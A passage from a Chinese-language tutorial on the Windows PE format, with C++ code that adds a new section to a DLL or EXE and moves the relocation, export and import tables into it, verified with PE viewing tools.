lpNewBuffer; &#125;); printf(&quot;[+] AddANewSection_ForFileBuffer successfully. &quot;); //移动重定位块到新节 if (!PEFile.RemoveReloactionTableToTheNewSection(lpNewBuffer)) &#123; return 1; &#125; printf(&quot;[+] RemoveReloactionTableToTheNewSection successfully. &quot;); //存盘 if (!PEFile.SaveUnstretchedPEToDisk(lpNewBuffer,&quot;ReloactionTableRemoved&quot;)) &#123; return 1; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return 0;&#125; 具体实现 新增节AddANewSection移动重定位表到新节辅助函数计算重定位块的大小CalculateTotalRelocationSize这里就是简单判断现有节表后是否够80个字节，没考虑空间不够时NT头上移的操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566LPVOID PEManipulator::AddANewSection(DWORD dwNewSectionSize)&#123; //1、判断现有的节表后是否有足够的空间新添加一个节表 // 计算各个部分的大小 DWORD SizeDos = m_DosHdr-&gt;e_lfanew; // DOS头的大小（DOS MZ+DOS Stub） DWORD SizeNt = sizeof(m_NtHdr-&gt;Signature) + IMAGE_SIZEOF_FILE_HEADER + m_PeHdr-&gt;SizeOfOptionalHeader; //NT头的总大小 DWORD SizeSection = m_PeHdr-&gt;NumberOfSections * sizeof(IMAGE_SECTION_HEADER); //节表的总大小 DWORD dwAvailableSpace = m_OptionalPeHdr-&gt;SizeOfHeaders //SizeOfHeaders-上面三部分之和 - SizeDos - SizeNt - SizeSection; printf(&quot; [+] Available space after the last section header: %lu bytes &quot;, dwAvailableSpace); if (dwAvailableSpace &lt; 80) // 空间不够放两个节表，则退出 这里不考虑NT头上移 &#123; printf(&quot; [!] Not enough space to add a new section header. Required: 80 bytes, available: %lu bytes. &quot;, dwAvailableSpace); return nullptr; &#125; //2、申请新空间，将原buffer内容拷过去 DWORD dwNewBufferSize = m_OptionalPeHdr-&gt;SizeOfImage + AlignUp(dwNewSectionSize, m_OptionalPeHdr-&gt;SectionAlignment); //新Buffer的大小=原Buffer的SizeOfImage + 按内存对齐后的dwNewSectionSize LPVOID lpNewBuffer = new BYTE[dwNewBufferSize](); //since C++11 ,it&#x27;s ok printf(&quot;[+] new for NewBuffer successfully. &quot;); memcpy(lpNewBuffer, m_lpFileBuffer, CalculateUnstretchedPESize(m_lpFileBuffer)); //获取NewBuffer中相关的PE指针 auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return nullptr; &#125; // 3、修改相关字段 PIMAGE_SECTION_HEADER pSecHdrToLastSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1); //最后一个节表的节表指针 // （1）新节表 // 定义一个新节表，并填充各个字段 IMAGE_SECTION_HEADER NewSectionTable = &#123; 0 &#125;; memcpy(NewSectionTable.Name, &quot;.NewSec&quot;, 8); // 注意：最多8个字符，不含NULL终止符 // NewSectionTable.Name = &quot;.NewSec&quot;; // 根据参数来算 NewSectionTable.Misc.VirtualSize = dwNewSectionSize; NewSectionTable.VirtualAddress = pOptionalPeHdr_NewBuffer-&gt;SizeOfImage; NewSectionTable.SizeOfRawData = AlignUp(dwNewSectionSize, pOptionalPeHdr_NewBuffer-&gt;FileAlignment); NewSectionTable.PointerToRawData = pSecHdrToLastSection-&gt;PointerToRawData + pSecHdrToLastSection-&gt;SizeOfRawData; NewSectionTable.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE; //该块包含执行代码，可读、可写、可执行 // 将新节表内容烤到NewBuffer现有节表的末尾 PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + pPeHdr_NewBuffer-&gt;NumberOfSections; memcpy(pNewSection, &amp;NewSectionTable, sizeof(IMAGE_SECTION_HEADER)); //将新增的节表追加到最后一个节表后面 memset(pNewSection + 1, 0, sizeof(IMAGE_SECTION_HEADER)); //再添加一个全为0的节表收尾，作为结束标志 // （2）更新节表数量 ++pPeHdr_NewBuffer-&gt;NumberOfSections; //（3）更新SizeOfImage的大小 pOptionalPeHdr_NewBuffer-&gt;SizeOfImage += AlignUp(dwNewSectionSize, pOptionalPeHdr_NewBuffer-&gt;SectionAlignment); printf(&quot; [+] A new section has been added successfully. &quot;); return lpNewBuffer;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041BOOL PEManipulator::RemoveReloactionTableToTheNewSection(LPVOID lpNewBuffer)&#123; //获取NewBuffer中相关的PE指针 auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; // 计算重定位表的总大小 DWORD dwRelocSize = CalculateTotalRelocationSize(lpNewBuffer); if (dwRelocSize == 0) &#123; printf(&quot; [-] Failed to calculate relocation size or no relocation data present. &quot;); return FALSE; &#125; // 获取重定位表指针 auto pBaseReloc = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC, lpNewBuffer); if (!pBaseReloc) &#123; printf(&quot; [-] No Base Relocation Table found after size calculation. &quot;); return FALSE; &#125; // 确定新节的位置和大小 PIMAGE_SECTION_HEADER pNewSection = &amp;pSecHdr_NewBuffer[pPeHdr_NewBuffer-&gt;NumberOfSections - 1]; DWORD dwNewRelocTableFOA = pNewSection-&gt;PointerToRawData; // 复制重定位表到新节 memcpy((PBYTE)lpNewBuffer + dwNewRelocTableFOA, pBaseReloc, dwRelocSize); // 更新数据目录项中重定位表的RVA地址指向 pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = pNewSection-&gt;VirtualAddress; printf(&quot; [+] Relocation table moved successfully to new section. &quot;); return TRUE;&#125;考虑到数据目录表中的Size值可能不准，所以自己写程序算一遍重定位块的大小。计算后可以顺便打印对比下这两个值看下有什么区别。 计算方法：遍历重定位块，将所有SizeOfBlock相加。出循环后，还要手动再加8字节算上结尾的全0结构体的大小，因为结束标记那个结构体的SizeOfBlock是0。 1234567891011121314151617181920212223242526DWORD PEManipulator::CalculateTotalRelocationSize(LPVOID lpBuffer)&#123; auto pBaseReloc = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC, lpBuffer); if (!pBaseReloc) &#123; printf(&quot; [-] No Base Relocation Table found. &quot;); return 0; &#125; DWORD dwTotalSize = 0; while (pBaseReloc-&gt;SizeOfBlock) &#123; dwTotalSize += pBaseReloc-&gt;SizeOfBlock; pBaseReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc + pBaseReloc-&gt;SizeOfBlock); &#125; // 添加末尾8字节结构体的大小 dwTotalSize += sizeof(IMAGE_BASE_RELOCATION); // 打印信息 printf(&quot; [+] Calculated Total Relocation Size: 0x%X bytes &quot;, dwTotalSize); printf(&quot; [+] Data Directory Reported Size: 0x%X bytes &quot;, ((PIMAGE_OPTIONAL_HEADER32)GetOptionPeHeaders(lpBuffer))-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size); return dwTotalSize;&#125; 上面代码最后两行打印了自己算的大小和数据目录表中的Size用于观察对比 遍历SizeOfBlock+8字节的大小 数据目录表中重定位表Size的大小 运行输出12[+] Calculated Total Relocation Size: 0x13CC bytes[+] Data Directory Reported Size: 0x13C4 bytes 代码算的相比数据目录表中Size多8字节，也就是说数据目录表中的Size是没算上结尾的8字节结构体的大小。 运行结果 VC的dllVS的dll PE文件的差异是： 原dll文件 新dll文件 节表数量 5 6 SizeOfImage 39000h 3B000h 数据目录表中重定位表.RVA 37000h 39000h 新节的节表信息 用LordPE看原dll中重定位块数据，在新dll中看到这些重定位块数据被移到了新节中 PE文件的差异是： 原dll文件 新dll文件 节表数量 9 Ah SizeOfImage 20000h 22000h 数据目录表中重定位表.RVA 1F000h 20000h 新节的节表信息 用LordPE看原dll中重定位块数据，在新dll中看到这些重定位块数据被移到了新节中 移动导出表 要拷贝的内容有： 函数地址表 无需拷贝表中地址所指向的函数内容。让系统加载器加载PE时能通过这张地址表得到函数地址即可，查函数地址这个过程和函数地址指向的内容无关 序号表 名称表，名称表中每个条目所指向的字符串 导出表结构体中Name字段指向的字符串（可选操作，这个Name是辅助信息） 整个导出表结构体 从要拷贝的内容上看，比较麻烦的是函数名字符串的拷贝。因为函数名长度不定，没法简单按大小*数量的方式整块拷走，只能遍历名称表的每个条目，单独拷贝每个字符串。拷字符串时可以顺带修正名称表中的条目。操作步骤如下： 将名称表移动到新的位置。然后，遍历（新位置）名称表中的每个条目 对于每一项，根据其RVA地址定位到相应的字符串，将这些字符串拷贝到新位置 顺带更新名称表中的RVA地址，让其指向新的字符串的地址。 程序流程设计： 获得dll文件的m_lpFileBuffer文件内存映像（未拉伸），获取相关PE指针 对m_lpFileBuffer新增大小为0x2000的节，返回出lpNewBuffer（未拉伸） 在lpNewBuffer上移动导出表到新节 具体做法是： 指向地址表后，拷走整个地址表，记录新地址表的RVA 指向序号表后，拷走整个序号表，记录新序号表的RVA 指向名称表后，拷走整个名称表，记录新名称表的RVA 根据新名称表中的RVA逐个拷走其指向的字符串，并更新名称表中其指向的字符串地址 指向导出表中Name字符串，拷走，记录Name新位置的RVA 拷走整个导出表结构，修正Name、AddressOfFunctions、AddressOfNameOrdinals、AddressOfNames字段 更新数据目录项中导出表的RVA地址指向 将lpNewBuffer存盘 检验办法：使用DependenciesGui打开新dll，看能否解析出导出函数的信息 测试函数 大致流程12345678910111213141516171819202122232425262728293031323334353637//测试移动导出表int TestRemoveExportTable()&#123; //写死的，方便测试用 //PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VC的 PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VS的 if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; //新增节 LPVOID lpNewBuffer = PEFile.AddANewSection(0x2000); //新节直接0x2000，也可以先算一遍，按需新增节的大小 if (!lpNewBuffer) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] lpNewBuffer; &#125;); printf(&quot;[+] AddANewSection for m_lpFileBuffer successfully. &quot;); //移动导出表到新节 if (!PEFile.MoveExportTableToNewSection(lpNewBuffer)) &#123; return 1; &#125; printf(&quot;[+] RemoveReloactionTableToTheNewSection successfully. &quot;); //存盘 if (!PEFile.SaveUnstretchedPEToDisk(lpNewBuffer, &quot;ExportTableRemoved&quot;)) &#123; return 1; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return 0;&#125; 具体实现 1BOOL MoveExportTableToNewSection(LPVOID lpNewBuffer); 获取相关PE指针，和导出表指针 123456789101112131415//获取NewBuffer中相关的PE指针auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer);auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer);auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer);if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE;&#125;// 获取导出表指针auto pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_EXPORT, lpNewBuffer);if (!pExportDirectory)&#123; return FALSE;&#125; 指向新节起始位置，准备移动数据 123// 新节的起始位置PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1); //指针运算操作DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; dwDstOffset这个值是新节.PointerToRawData，在后面拷贝完某块数据后会进行更新。 dwDstOffset这个值是FOA（相对于文件头的偏移），因为我们都是在未拉伸的Buffer上操作。而导出表中存的字段都是RVA地址，所以后面要用到FOAToRVA 移动数据 进行地址表、序号表、名称表+其指向的字符串、Name字符串、导出表结构的移动。它们的代码逻辑很像，大致都是： 123451、获得指向待拷贝数据的指针，拷xx大小到(PBYTE)(DWORD(lpNewBuffer)+dwDstOffset)处2、记录当前地址dwDstOffset，转成RVA （因为这是个FOA）3、更新dwDstOffset的值4、进行下一个块数据的拷贝，步骤同1-3 地址表序号表名称表1234567891011121314151617// 地址表DWORD dwFunctionTableFOA = 0;if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA))&#123; return FALSE;&#125;auto pFunctionTable = PDWORD((DWORD)lpNewBuffer + dwFunctionTableFOA); //指向地址表 memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pFunctionTable, (pExportDirectory-&gt;NumberOfFunctions) * sizeof(DWORD)); DWORD dwNewFunctionTableFOA = dwDstOffset; //记录地址表新的起始位置，用于后面更新导出表结构体中的AddressOfFunctions字段DWORD dwNewFunctionTableRVA = 0;if (!FOAToRVA(dwNewFunctionTableFOA, dwNewFunctionTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += (pExportDirectory-&gt;NumberOfFunctions) * sizeof(DWORD);1234567891011121314151617// 序号表DWORD dwOrdinalTableFOA = 0;if (!RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA))&#123; return FALSE;&#125;auto pOrdinalTable = PWORD((DWORD)lpNewBuffer + dwOrdinalTableFOA); //指向序号表 memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pOrdinalTable, (pExportDirectory-&gt;NumberOfNames) * sizeof(WORD)); DWORD dwNewOrdinalTableFOA = dwDstOffset; //记录序号表新的起始位置，用于后面更新导出表结构体中的AddressOfNameOrdinals字段DWORD dwNewOrdinalTableRVA = 0;if (!FOAToRVA(dwNewOrdinalTableFOA, dwNewOrdinalTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += (pExportDirectory-&gt;NumberOfNames) * sizeof(WORD);1234567891011121314151617// 名称表DWORD dwNameTableFOA = 0;if (!RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA))&#123; return FALSE;&#125;auto pNameTable = PDWORD((DWORD)lpNewBuffer + dwNameTableFOA); //指向名称表 memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pNameTable, (pExportDirectory-&gt;NumberOfNames) * sizeof(DWORD)); DWORD dwNewNameTableFOA = dwDstOffset; //记录名称表新的起始位置，用于后面更新导出表结构体中的AddressOfNames字段DWORD dwNewNameTableRVA = 0;if (!FOAToRVA(dwNewNameTableFOA, dwNewNameTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += (pExportDirectory-&gt;NumberOfNames) * sizeof(DWORD); 处理名称表指向的字符串12345678910111213141516171819202122232425// 拷名字，边拷名字边修复新的名称表里的值auto pNewNameTable = (PDWORD)((DWORD)lpNewBuffer + dwNewNameTableFOA);for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; DWORD dwNameRVA = pNameTable[i]; DWORD dwNameFOA = 0; if (!RVAToFOA(dwNameRVA, dwNameFOA)) &#123; return FALSE; &#125; PCHAR Name = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); //指向名字 DWORD dwNameLength = strlen(Name) + 1; memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), Name, dwNameLength); //拷贝字符串 DWORD dwNewNameFOA = dwDstOffset; //记录名字新的起始位置，用于后面更新名称表中的RVA地址 DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; pNewNameTable[i] = dwNewNameRVA; //更新名称表中的RVA地址 dwDstOffset += dwNameLength;&#125; 导出表的Name字段处理，和地址表、序号表、名称表处理代码逻辑一样 1234567891011121314151617// 导出表中的Name字段DWORD dwNameFOA = 0;if (!RVAToFOA(pExportDirectory-&gt;Name, dwNameFOA))&#123; return FALSE;&#125;auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); //指向名字 memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); //拷贝字符串 DWORD dwNewNameFOA = dwDstOffset; //记录名称表新的起始位置，用于后面更新导出表结构体中的AddressOfNames字段DWORD dwNewNameRVA = 0;if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += strlen(cName) + 1; 拷贝导出表结构体到新的位置，和地址表、序号表、名称表处理代码逻辑一样 12345678910//拷贝导出表结构体到新的位置DWORD dwNewExportDirectoryFOA = dwDstOffset; //记录导入表新的起始位置，用于后面更新数据目录表中导出表描述的VirtualAddress字段DWORD dwNewExportDirectoryRVA = 0;if (!FOAToRVA(dwNewExportDirectoryFOA, dwNewExportDirectoryRVA, lpNewBuffer))&#123; return FALSE;&#125; memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pExportDirectory, sizeof(IMAGE_EXPORT_DIRECTORY));//dwDstAddr += sizeof(IMAGE_EXPORT_DIRECTORY); 更新导出表结构体中的字段 123456//修正字段auto pNewExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)lpNewBuffer + dwDstOffset);pNewExportDirectory-&gt;Name = dwNewNameRVA;pNewExportDirectory-&gt;AddressOfFunctions = dwNewFunctionTableRVA;pNewExportDirectory-&gt;AddressOfNameOrdinals = dwNewOrdinalTableRVA;pNewExportDirectory-&gt;AddressOfNames = dwNewNameTableRVA; 更新数据目录表中重定位表RVA地址的指向 12//更新数据目录表中的导出表VirtualAddresspOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress = dwNewExportDirectoryRVA; 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153BOOL PEManipulator::MoveExportTableToNewSection(LPVOID lpNewBuffer)&#123; //获取NewBuffer中相关的PE指针 auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; // 获取导出表指针 auto pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_EXPORT, lpNewBuffer); if (!pExportDirectory) &#123; return FALSE; &#125; // 新节的起始位置 PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1); //指针运算操作 //DWORD dwNewExportTableFOA = pNewSection-&gt;PointerToRawData; //DWORD dwDstOffset = dwNewExportTableFOA; DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; //准备移动数据 // 地址表 DWORD dwFunctionTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA)) &#123; return FALSE; &#125; auto pFunctionTable = PDWORD((DWORD)lpNewBuffer + dwFunctionTableFOA); //指向地址表 memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pFunctionTable, (pExportDirectory-&gt;NumberOfFunctions) * sizeof(DWORD)); DWORD dwNewFunctionTableFOA = dwDstOffset; //记录地址表新的起始位置，用于后面更新导出表结构体中的AddressOfFunctions字段 DWORD dwNewFunctionTableRVA = 0; if (!FOAToRVA(dwNewFunctionTableFOA, dwNewFunctionTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += (pExportDirectory-&gt;NumberOfFunctions) * sizeof(DWORD); // 序号表 DWORD dwOrdinalTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA)) &#123; return FALSE; &#125; auto pOrdinalTable = PWORD((DWORD)lpNewBuffer + dwOrdinalTableFOA); //指向序号表 memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pOrdinalTable, (pExportDirectory-&gt;NumberOfNames) * sizeof(WORD)); DWORD dwNewOrdinalTableFOA = dwDstOffset; //记录序号表新的起始位置，用于后面更新导出表结构体中的AddressOfNameOrdinals字段 DWORD dwNewOrdinalTableRVA = 0; if (!FOAToRVA(dwNewOrdinalTableFOA, dwNewOrdinalTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += (pExportDirectory-&gt;NumberOfNames) * sizeof(WORD); // 名称表 DWORD dwNameTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA)) &#123; return FALSE; &#125; auto pNameTable = PDWORD((DWORD)lpNewBuffer + dwNameTableFOA); //指向名称表 memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pNameTable, (pExportDirectory-&gt;NumberOfNames) * sizeof(DWORD)); DWORD dwNewNameTableFOA = dwDstOffset; //记录名称表新的起始位置，用于后面更新导出表结构体中的AddressOfNames字段 DWORD dwNewNameTableRVA = 0; if (!FOAToRVA(dwNewNameTableFOA, dwNewNameTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += (pExportDirectory-&gt;NumberOfNames) * sizeof(DWORD); // 拷名字，边拷名字边修复新的名称表里的值 auto pNewNameTable = (PDWORD)((DWORD)lpNewBuffer + dwNewNameTableFOA); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; DWORD dwNameRVA = pNameTable[i]; DWORD dwNameFOA = 0; if (!RVAToFOA(dwNameRVA, dwNameFOA)) &#123; return FALSE; &#125; PCHAR Name = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); //指向名字 DWORD dwNameLength = strlen(Name) + 1; memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), Name, dwNameLength); //拷贝字符串 DWORD dwNewNameFOA = dwDstOffset; //记录名字新的起始位置，用于后面更新名称表中的RVA地址 DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; pNewNameTable[i] = dwNewNameRVA; //更新名称表中的RVA地址 dwDstOffset += dwNameLength; &#125; // 导出表中的Name字段 DWORD dwNameFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;Name, dwNameFOA)) &#123; return FALSE; &#125; auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); //指向名字 memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); //拷贝字符串 DWORD dwNewNameFOA = dwDstOffset; //记录名称表新的起始位置，用于后面更新导出表结构体中的AddressOfNames字段 DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += strlen(cName) + 1; //拷贝导出表结构体到新的位置 DWORD dwNewExportDirectoryFOA = dwDstOffset; //记录导入表新的起始位置，用于后面更新数据目录表中导出表描述的VirtualAddress字段 DWORD dwNewExportDirectoryRVA = 0; if (!FOAToRVA(dwNewExportDirectoryFOA, dwNewExportDirectoryRVA, lpNewBuffer)) &#123; return FALSE; &#125; memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pExportDirectory, sizeof(IMAGE_EXPORT_DIRECTORY)); //dwDstAddr += sizeof(IMAGE_EXPORT_DIRECTORY); //修正字段 auto pNewExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)lpNewBuffer + dwDstOffset); pNewExportDirectory-&gt;Name = dwNewNameRVA; pNewExportDirectory-&gt;AddressOfFunctions = dwNewFunctionTableRVA; pNewExportDirectory-&gt;AddressOfNameOrdinals = dwNewOrdinalTableRVA; pNewExportDirectory-&gt;AddressOfNames = dwNewNameTableRVA; //更新数据目录表中的导出表VirtualAddress pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress = dwNewExportDirectoryRVA; printf(&quot;[+] Export Table successfully moved to new section. &quot;); return TRUE;&#125; 运行结果 VC的dllVS的dll 使用DependenciesGui打开新dll，能解析出导出函数的信息 使用DependenciesGui打开新dll，能解析出导出函数的信息 移动导入表 要移动的内容： 所有导入表（IID结构） 每张导入表里的INT表 INT表指向的提示名表（如果INT表项是函数名方式导入的话） 导入表的Name字段 IAT表不能移，这里的“不能移”是指移动的代价太大。在程序中有对IAT表表项地址的引用，比如 1call dword ptr [xxxx]\t;xxxx是导入表表项地址，在PE加载后被替换为导入函数的函数地址 将IAT表移走的话，需要知道程序中这些引用并修正它们 目前笔者不清楚怎么得知这些引用 导入表和INT表以全0结构体结尾，导入表几张，每个导入表下的INT表有几项，需要遍历一次才知道。 拷数据的顺序可以看需求 123456789101112131415拷贝方式一：\t新位置上数据依次为： 所有导入表结构，所有INT表，所有名称提示表\t伪代码： 第一个while()统计导入表个数并移动 第二个while，里层while，处理所有INT表 第三个while()，里层while遍历INT表，处理所有提示名表；外层while处理Name字段拷贝方式二：\t新位置上数据依次为： 所有导入表结构；第一个导入表的INT表，提示名表，Name字段；第二个导入表的INT表，提示名表，Name字段；...\t伪代码： 第一个while()统计导入表个数并移动 第二个while，里层while处理INT表，处理提示名表；处理Name字段 因为想让相同的数据放一块，后面代码是按方式一的顺序来移动导入表数据 程序流程设计： 获得exe文件的m_lpFileBuffer文件内存映像（未拉伸），获取相关PE指针 对m_lpFileBuffer新增大小为0x2000的节，返回出lpNewBuffer（未拉伸） 在lpNewBuffer上移动导入表到新节 具体做法是： 遍历导入表，统计个数，将导入表拷走，记录新导入表的RVA 指向新导入表，遍历它，将所有INT表拷走；记录新INT表的RVA，更新导入表中OriginalFirstThunk指向 指向新导入表，遍历INT表 处理INT表指向的提示名表；记录新提示名表的RVA，更新INT表指向 处理导入表的Name字符串，拷走；记录Name新位置的RVA，更新导入表Name字段指向 更新数据目录项中导入表的RVA地址指向 将lpNewBuffer存盘 检验办法： 运行修改后存盘的exe，看能否正常运行 使用PE工具对比修改前后exe的导入表信息 测试函数 大致流程123456789101112131415161718192021222324252627282930313233343536//测试移动导入表int TestMoveImportTable()&#123; //写死的，方便测试用 PEManipulator PEFile(&quot;E:\\\\temp\\\\MoveImportTable\\\\fg.exe&quot;); //文件对齐=内存对齐 if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; //新增节 LPVOID lpNewBuffer = PEFile.AddANewSection(0x2000); //新节直接0x2000，也可以先算一遍，按需新增节的大小 if (!lpNewBuffer) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] lpNewBuffer; &#125;); printf(&quot;[+] AddANewSection for m_lpFileBuffer successfully. &quot;); //移动导出表到新节 if (!PEFile.MoveImportTableToNewSection(lpNewBuffer)) &#123; return 1; &#125; printf(&quot;[+] MoveImportTableToNewSection successfully. &quot;); //存盘 if (!PEFile.SaveUnstretchedPEToDisk(lpNewBuffer, &quot;ImportTableRemoved&quot;)) &#123; return 1; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return 0;&#125; 具体实现 1BOOL PEManipulator::MoveImportTableToNewSection(LPVOID lpNewBuffer) 获取相关PE指针，和导入表指针 123456789101112131415//获取NewBuffer中相关的PE指针auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer);auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer);auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer);if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE;&#125;// 获取导入表指针auto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT, lpNewBuffer);if (!pImportDirectory)&#123; return FALSE;&#125; 指向新节起始位置，准备移动数据 123// 新节的起始位置PIMAGE_SECTION_HEADER pNewSection = &amp;pSecHdr_NewBuffer[pPeHdr_NewBuffer-&gt;NumberOfSections - 1];DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; dwDstOffset这个值是新节.PointerToRawData，在后面拷贝完某块数据后会进行更新。 dwDstOffset这个值是FOA（相对于文件头的偏移），因为我们都是在未拉伸的Buffer上操作。而导出表中存的字段都是RVA地址，所以要用到FOAToRVA 移动全部导入表 12345678910111213141516//1、统计导入表个数，随后将导入表移动到新位置BYTE ImportTableCount = 0;while (pImportDirectory[ImportTableCount].OriginalFirstThunk &amp;&amp; pImportDirectory[ImportTableCount].FirstThunk)&#123; ++ImportTableCount;&#125;DWORD ImportTableSize = (ImportTableCount + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR); // +1 for null terminatormemcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pImportDirectory, ImportTableSize); DWORD dwNewImportTableFOA = 